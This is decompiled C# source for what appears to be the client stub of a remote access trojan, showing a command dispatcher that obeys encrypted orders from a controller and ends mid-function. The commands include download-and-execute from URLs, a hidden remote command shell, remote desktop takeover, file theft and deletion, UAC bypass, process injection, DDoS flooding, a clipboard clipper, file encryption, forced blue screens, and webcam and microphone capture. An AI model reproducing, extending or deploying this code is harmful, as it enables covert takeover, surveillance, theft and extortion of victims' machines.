using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub;

public class Messages
{
	private delegate void AppendOutputTextDelegate(string text);

	private static readonly object SPL = RuntimeHelpers.GetObjectValue(ClientSocket.SPL);

	[AccessedThroughProperty("MyProcess")]
	private static Process _MyProcess;

	private static int processid;

	public static int ngrok;

	public static int RS;

	public static int KL;

	public static string KLP = Path.GetTempPath() + "XKlog.txt";

	public static IntPtr Handle;

	public static int Net3;

	private static Process MyProcess
	{
		get
		{
			return _MyProcess;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DataReceivedEventHandler value2 = MyProcess_ErrorDataReceived;
			DataReceivedEventHandler value3 = MyProcess_OutputDataReceived;
			if (_MyProcess != null)
			{
				_MyProcess.ErrorDataReceived -= value2;
				_MyProcess.OutputDataReceived -= value3;
			}
			_MyProcess = value;
			if (_MyProcess != null)
			{
				_MyProcess.ErrorDataReceived += value2;
				_MyProcess.OutputDataReceived += value3;
			}
		}
	}

	public static void AppendOutputText(string text)
	{
		try
		{
			new AppendOutputTextDelegate(AppendOutputText);
			ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"R/", SPL), (object)text), SPL), (object)Helper.ID())));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void MyProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\nError: " + e.Data + "\r\n");
	}

	private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\n" + e.Data);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Read(byte[] b)
	{
		//IL_1569: Unknown result type (might be due to invalid IL or missing references)
		//IL_1580: Expected O, but got Unknown
		//IL_27cf: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(SPL), -1, (CompareMethod)0);
			switch (array[0])
			{
			case "rec":
				Helper.CloseMutex();
				Application.Restart();
				Environment.Exit(0);
				break;
			case "CLOSE":
				ClientSocket.S.Shutdown(SocketShutdown.Both);
				ClientSocket.S.Close();
				Environment.Exit(0);
				break;
			case "uninstall":
			{
				Settings.USBS.stopp();
				object obj12 = Helper.objj(array[1]);
				object[] array5 = new object[1] { Settings.nameee };
				object[] array34 = array5;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj12, (Type)null, "un", array34, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
				}
				break;
			}
			case "update":
			{
				object obj31 = Helper.objj(array[1]);
				object[] array5 = new object[3]
				{
					Settings.nameee,
					null,
					null
				};
				object[] array83 = array5;
				string[] array43 = array;
				string[] array84 = array43;
				int num4 = 2;
				array83[1] = array84[2];
				object[] array85 = array5;
				string[] array7 = array;
				string[] array86 = array7;
				int num = 3;
				array85[2] = array86[3];
				object[] array2 = array5;
				object[] array87 = array2;
				bool[] array4 = new bool[3] { true, true, true };
				NewLateBinding.LateCall(obj31, (Type)null, "update", array87, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array43[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				break;
			}
			case "DW":
				Download(array[1], array[2]);
				break;
			case "RD-":
			{
				object obj29 = Screen.get_PrimaryScreen().get_Bounds().Size;
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"RD-", SPL), NewLateBinding.LateGet(obj29, (Type)null, "Width", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), NewLateBinding.LateGet(obj29, (Type)null, "Height", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), (object)Helper.ID())));
				break;
			}
			case "RD+":
				RemoteDesktop.Capture(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
				break;
			case "###":
			{
				Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				Cursor.set_Position(position);
				mouse_event(Conversions.ToInteger(array[3]), 0, 0, 0, 1);
				break;
			}
			case "$$$":
			{
				Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				Cursor.set_Position(position);
				break;
			}
			case "^^^&":
			{
				bool flag = Convert.ToBoolean(array[2]);
				byte bVk = Convert.ToByte(array[1]);
				keybd_event(bVk, 0, (!flag) ? 2u : 0u, UIntPtr.Zero);
				break;
			}
			case "FM":
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "Memory", new object[1] { RuntimeHelpers.GetObjectValue(Helper.frombase64(array[2])) }, (string[])null, (Type[])null, (bool[])null, true);
				});
				thread2.Start();
				GC.Collect();
				break;
			}
			case "LN":
			{
				string fileName = Path.GetTempFileName() + "-" + array[1];
				WebClient webClient = new WebClient();
				webClient.DownloadFile(array[2], fileName);
				Process.Start(fileName);
				GC.Collect();
				break;
			}
			case "getinfo":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"getinfo", SPL), (object)Helper.ID())));
				break;
			case "Xinfo":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"Xinfo", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), (object)Helper.ID())));
				break;
			case "url":
				Process.Start(array[1]);
				break;
			case "openhide":
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
				object[] array5 = new object[1];
				object[] array10 = array5;
				string[] array7 = array;
				string[] array11 = array7;
				int num = 1;
				array10[0] = array11[1];
				object[] array2 = array5;
				object[] array12 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(objectValue, (Type)null, "navigate", array12, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				NewLateBinding.LateSet(objectValue, (Type)null, "visible", new object[1] { 0 }, (string[])null, (Type[])null);
				break;
			}
			case "shellfuc":
				Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
				break;
			case "regfuc":
			{
				object obj27 = Interaction.CreateObject("WScript.Shell", "");
				object[] array5 = new object[3];
				object[] array78 = array5;
				string[] array7 = array;
				string[] array79 = array7;
				int num = 1;
				array78[0] = array79[1];
				array5[1] = Convert.ToInt32(array[2]);
				array5[2] = "REG_DWORD";
				object[] array2 = array5;
				object[] array80 = array2;
				bool[] array4 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj27, (Type)null, "RegWrite", array80, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "bot":
			{
				object obj23 = Helper.objj(array[1]);
				object[] array2 = new object[1] { Settings.path2 };
				object[] array72 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj23, (Type)null, "RunBotKiller", array72, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "admin":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "uac", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "bypss":
			{
				object obj19 = Helper.objj(array[1]);
				object[] array2 = new object[1] { Settings.path2 };
				object[] array68 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj19, (Type)null, "calluac", array68, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "script":
			{
				object obj14 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array40 = array5;
				string[] array7 = array;
				string[] array41 = array7;
				int num = 2;
				array40[0] = array41[2];
				object[] array42 = array5;
				string[] array43 = array;
				string[] array44 = array43;
				int num4 = 3;
				array42[1] = array44[3];
				object[] array2 = array5;
				object[] array45 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj14, (Type)null, "exc", array45, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array43[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "DDosS":
				if (Operators.CompareString(Settings.dosstu, "!", false) != 0)
				{
					Settings.doshost = array[1];
					Settings.dosport = array[2];
					Settings.dostype = array[3];
					if (Operators.CompareString(Settings.dostype, "UDP", false) == 0)
					{
						Settings.dTimer2.Interval = 100.0;
					}
					if (Operators.CompareString(Settings.dostype, "TCP", false) == 0)
					{
						Settings.dTimer2.Interval = 1.0;
					}
					Settings.dTimer2.Start();
					Settings.dosstu = "!";
				}
				break;
			case "DDosT":
				Settings.dTimer2.Stop();
				Settings.dosstu = null;
				Settings.doshost = null;
				Settings.dosport = null;
				Settings.dostype = null;
				break;
			case "Cilpper":
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					object obj33 = Helper.objj(array[1]);
					object[] array93 = new object[2];
					string[] array94 = array;
					int num5 = 2;
					array93[0] = array94[2];
					string[] array95 = array;
					int num6 = 3;
					array93[1] = array95[3];
					object[] array96 = array93;
					bool[] array97 = new bool[2] { true, true };
					NewLateBinding.LateCall(obj33, (Type)null, "Clipper", array96, (string[])null, (Type[])null, array97, true);
					if (array97[0])
					{
						array94[num5] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array96[0]), typeof(string));
					}
					if (array97[1])
					{
						array95[num6] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array96[1]), typeof(string));
					}
				});
				thread.Start();
				GC.Collect();
				break;
			}
			case "PE":
				if (File.Exists(array[2]))
				{
					object obj2 = Helper.objj(array[1]);
					object[] array5 = new object[2];
					object[] array6 = array5;
					string[] array7 = array;
					string[] array8 = array7;
					int num = 2;
					array6[0] = array8[2];
					array5[1] = RuntimeHelpers.GetObjectValue(Helper.frombase64(array[3]));
					object[] array2 = array5;
					object[] array9 = array2;
					bool[] array4 = new bool[2] { true, false };
					NewLateBinding.LateCall(obj2, (Type)null, "injRun", array9, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
				}
				break;
			case "vbb":
			{
				object obj32 = Helper.objj(array[1]);
				object[] array5 = new object[2];
				object[] array88 = array5;
				string[] array7 = array;
				string[] array89 = array7;
				int num = 2;
				array88[0] = array89[2];
				object[] array90 = array5;
				string[] array43 = array;
				string[] array91 = array43;
				int num4 = 3;
				array90[1] = array91[3];
				object[] array2 = array5;
				object[] array92 = array2;
				bool[] array4 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj32, (Type)null, "CallV", array92, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					array43[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				break;
			}
			case "PSleep":
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "PreventSleep", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				});
				thread3.Start();
				GC.Collect();
				break;
			}
			case "xxx":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"xxx", SPL), (object)Helper.ID())));
				break;
			case "R/":
				try
				{
					try
					{
						using Process process2 = new Process();
						process2.StartInfo.FileName = "taskkill.exe";
						process2.StartInfo.Arguments = " /pid " + Conversions.ToString(processid) + " /f";
						process2.StartInfo.UseShellExecute = false;
						process2.StartInfo.RedirectStandardError = false;
						process2.StartInfo.RedirectStandardOutput = false;
						process2.StartInfo.CreateNoWindow = true;
						process2.Start();
						process2.WaitForExit();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					MyProcess = new Process();
					ProcessStartInfo startInfo = MyProcess.StartInfo;
					startInfo.FileName = "CMD.EXE";
					startInfo.UseShellExecute = false;
					startInfo.CreateNoWindow = true;
					startInfo.RedirectStandardInput = true;
					startInfo.RedirectStandardOutput = true;
					startInfo.RedirectStandardError = true;
					startInfo = null;
					MyProcess.Start();
					processid = MyProcess.Id;
					MyProcess.BeginErrorReadLine();
					MyProcess.BeginOutputReadLine();
					AppendOutputText("Process Started at: " + MyProcess.StartTime);
					break;
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
					break;
				}
			case "runnnnnn":
				MyProcess.StandardInput.WriteLine(array[1]);
				MyProcess.StandardInput.Flush();
				break;
			case "closeshell":
				MyProcess.StandardInput.WriteLine("EXIT");
				MyProcess.StandardInput.Flush();
				MyProcess.Close();
				break;
			case "ppp":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"ppp", SPL), (object)Helper.ID())));
				break;
			case "R#":
			{
				string text6 = null;
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						text6 = text6 + Path.GetFileNameWithoutExtension(process.ProcessName) + Path.GetExtension(process.MainModule!.FileName!.ToString()) + "|+++|" + Conversions.ToString(process.Id) + "|+++|" + process.MainModule!.FileName!.ToString() + "*+*";
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R#", SPL), (object)text6), SPL), Operators.AddObject(Operators.AddObject((object)Process.GetCurrentProcess().MainModule!.FileName!.ToString(), SPL), (object)Helper.ID()))));
				break;
			}
			case "kill":
				Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
				break;
			case "kD":
				Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
				Thread.Sleep(500);
				File.Delete(array[2]);
				break;
			case "RST":
				Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
				Thread.Sleep(500);
				Process.Start(array[2]);
				break;
			case "cbb":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"cbb", SPL), (object)Helper.ID())));
				break;
			case "R$":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R$", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "GetText", new object[0], (string[])null, (Type[])null, (bool[])null)), SPL), (object)Helper.ID())));
				break;
			case "SETT":
			{
				object obj26 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array75 = array5;
				string[] array7 = array;
				string[] array76 = array7;
				int num = 2;
				array75[0] = array76[2];
				object[] array2 = array5;
				object[] array77 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj26, (Type)null, "setText", array77, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "clss":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "clearr", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "BSOD":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "BSOD", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "BScreen":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "Blank", new object[1] { Convert.ToInt32(array[2]) }, (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "InsW":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "INSS", new object[1] { Convert.ToInt32(array[2]) }, (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "|||":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"|||", SPL), (object)Helper.ID())));
				break;
			case "GetDrives":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)Helper.ID()), SPL), (object)getDrives())));
				break;
			case "FileManager":
				try
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)Helper.ID()), SPL), (object)getFolders(array[1])), (object)getFiles(array[1]))));
					break;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)Helper.ID()), SPL), (object)"Error")));
					ProjectData.ClearProjectError();
					break;
				}
			case "Delete":
			{
				string text5 = array[1];
				if (Operators.CompareString(text5, "Folder", false) == 0)
				{
					Directory.Delete(array[2], recursive: true);
				}
				else if (Operators.CompareString(text5, "File", false) == 0)
				{
					File.Delete(array[2]);
				}
				break;
			}
			case "Execute":
				Process.Start(array[1]);
				break;
			case "Rename":
			{
				string text2 = array[1];
				if (Operators.CompareString(text2, "Folder", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(array[2], array[3]);
				}
				else if (Operators.CompareString(text2, "File", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(array[2], array[3]);
				}
				break;
			}
			case "tss":
			{
				string text3 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(array[1]);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"txtttt", SPL), Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Helper.ID(), SPL), (object)text3), SPL), (object)array[1]))));
				break;
			}
			case "sedit":
			{
				StreamWriter streamWriter = new StreamWriter(array[1], append: false);
				streamWriter.WriteLine(array[2]);
				streamWriter.Close();
				break;
			}
			case "viewimage":
			{
				byte[] input;
				try
				{
					input = Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"viewimage", SPL), (object)Helper.ID()), ClientSocket.SPL), (object)Helper.BS(compress((Bitmap)Image.FromFile(array[1]), Conversions.ToInteger(array[2]))))));
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					break;
				}
				try
				{
					lock (ClientSocket.S)
					{
						using MemoryStream memoryStream = new MemoryStream();
						byte[] array58 = Helper.AES_Encryptor(input);
						byte[] array59 = Helper.SB(Conversions.ToString(array58.Length) + "\0");
						memoryStream.Write(array59, 0, array59.Length);
						memoryStream.Write(array58, 0, array58.Length);
						ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
						ClientSocket.S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
						GC.Collect();
						break;
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ClientSocket.isConnected = false;
					ProjectData.ClearProjectError();
					break;
				}
			}
			case "hidefolderfile":
				FileSystem.SetAttr(array[1], (FileAttribute)2);
				break;
			case "showfolderfile":
				FileSystem.SetAttr(array[1], (FileAttribute)0);
				break;
			case "creatnewfolder":
				((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(array[1]);
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				break;
			case "creatfile":
				File.Create(array[1]).Dispose();
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				break;
			case "downloadfile":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"downloadedfile", SPL), (object)Convert.ToBase64String(File.ReadAllBytes(array[1]))), SPL), (object)array[2]), SPL), (object)Helper.ID())));
				break;
			case "sendfileto":
				File.WriteAllBytes(array[1], Convert.FromBase64String(array[2]));
				GC.Collect();
				break;
			case "WL":
			{
				object obj16 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array55 = array5;
				string[] array7 = array;
				string[] array56 = array7;
				int num = 2;
				array55[0] = array56[2];
				object[] array2 = array5;
				object[] array57 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj16, (Type)null, "WL", array57, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				break;
			}
			case "DelP":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "del", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "7zIT":
				NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
			case "NETINS":
				if (Net3 != 1)
				{
					Net3 = 1;
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				break;
			case "7zzip":
				Interaction.Shell(Path.GetTempPath() + "7zip\\7z.exe" + array[1], (AppWinStyle)0, false, -1);
				break;
			case "CPP":
			{
				string[] array33 = Strings.Split(array[1], "|", -1, (CompareMethod)0);
				foreach (object obj11 in array33)
				{
					try
					{
						if (File.Exists(Conversions.ToString(obj11)))
						{
							File.Copy(Conversions.ToString(obj11), array[2] + Path.GetFileName(Conversions.ToString(obj11)));
						}
						if (Directory.Exists(Conversions.ToString(obj11)))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CopyDirectory(Conversions.ToString(obj11), array[2] + Path.GetFileName(Conversions.ToString(obj11)), true);
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				break;
			}
			case "CTT":
			{
				string[] array29 = Strings.Split(array[1], "|", -1, (CompareMethod)0);
				foreach (object obj9 in array29)
				{
					try
					{
						if (File.Exists(Conversions.ToString(obj9)))
						{
							File.Move(Conversions.ToString(obj9), array[2] + Path.GetFileName(Conversions.ToString(obj9)));
						}
						if (Directory.Exists(Conversions.ToString(obj9)))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().MoveDirectory(Conversions.ToString(obj9), array[2] + Path.GetFileName(Conversions.ToString(obj9)), true);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				break;
			}
			case "PRG":
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"PRG", SPL), (object)Helper.ID())));
				break;
			case "P@":
				ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"P@", SPL), Operators.AddObject(Operators.AddObject(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "InsProg", new object[0], (string[])null, (Type[])null, (bool[])null), SPL), (object)Helper.ID()))));
				break;
			case "UNS":
				Interaction.Shell(array[1], (AppWinStyle)1, false, -1);
				break;
			case "RSS":
			{
				object obj5 = Helper.objj(array[1]);
				object[] array5 = new object[1];
				object[] array19 = array5;
				string[] array7 = array;
				string[] array20 = array7;
				int num = 2;
				array19[0] = array20[2];
				object[] array2 = array5;
				object[] array21 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj5, (Type)null, "Run", array21, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				GC.Collect();
				break;
			}
			case "ENC":
			{
				object obj4 = Helper.objj(array[1]);
				object[] array5 = new object[2]
				{
					Helper.ID(),
					null
				};
				object[] array16 = array5;
				string[] array7 = array;
				string[] array17 = array7;
				int num = 2;
				array16[1] = array17[2];
				object[] array2 = array5;
				object[] array18 = array2;
				bool[] array4 = new bool[2] { false, true };
				NewLateBinding.LateCall(obj4, (Type)null, "ENC", array18, (string[])null, (Type[])null, array4, true);
				if (array4[1])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				GC.Collect();
				break;
			}
			case "DEC":
			{
				object obj3 = Helper.objj(array[1]);
				object[] array5 = new object[2]
				{
					Helper.ID(),
					null
				};
				object[] array13 = array5;
				string[] array7 = array;
				string[] array14 = array7;
				int num = 2;
				array13[1] = array14[2];
				object[] array2 = array5;
				object[] array15 = array2;
				bool[] array4 = new bool[2] { false, true };
				NewLateBinding.LateCall(obj3, (Type)null, "DEC", array15, (string[])null, (Type[])null, array4, true);
				if (array4[1])
				{
					array7[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				Thread.Sleep(500);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RL", SPL), (object)Helper.ID())));
				GC.Collect();
				break;
			}
			case "WBCM":
				if (Cam())
				{
					object obj30 = Helper.objj(array[1]);
					object[] array2 = new object[5]
					{
						Settings.Host,
						Settings.Port,
						Settings.SPL,
						Settings.KEY,
						Helper.ID()
					};
					object[] array82 = array2;
					bool[] array4 = new bool[5] { true, true, true, true, false };
					NewLateBinding.LateCall(obj30, (Type)null, "CON", array82, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					if (array4[1])
					{
						Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					if (array4[2])
					{
						Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
					}
					if (array4[3])
					{
						Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
					}
				}
				break;
			case "MICL":
			{
				object obj28 = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array81 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj28, (Type)null, "CON", array81, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
					Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(string));
				}
				if (array4[3])
				{
					Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(string));
				}
				break;
			}
			case "JustFun":
			{
				object obj25 = Helper.objj(array[1]);
				object[] array2 = new object[5]
				{
					Settings.Host,
					Settings.Port,
					Settings.SPL,
					Settings.KEY,
					Helper.ID()
				};
				object[] array74 = array2;
				bool[] array4 = new bool[5] { true, true, true, true, false };
				NewLateBinding.LateCall(obj25, (Type)null, "CON", array74, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
				}
				if (array4[1])
				{
					Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
				}
				if (array4[2])
				{
